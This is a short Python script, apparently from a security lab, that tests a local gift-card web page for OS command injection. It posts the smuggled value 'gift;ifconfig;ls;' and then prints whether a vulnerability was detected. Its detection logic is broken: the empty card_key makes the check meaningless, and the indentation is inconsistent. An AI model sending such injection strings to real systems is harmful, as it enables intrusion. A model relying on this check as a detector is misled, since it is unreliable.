import requests
URL = 'http://127.0.0.1:8000/use.html'
        malicious_command = "gift;ifconfig;ls;"
        card_key = ''
        session = requests.Session()
        body = session.post(URL, data=malicious_command)

        try:
            with open('Part1/OSCommand_Payload/dummy.gftcrd') as file:
                session.post(URL, data=file)
                if body.text.find(card_key):
                    print("OS Command Injection vulnerability detected!!!")
                else:
                    print("SAFE!!!")
        except:
            pass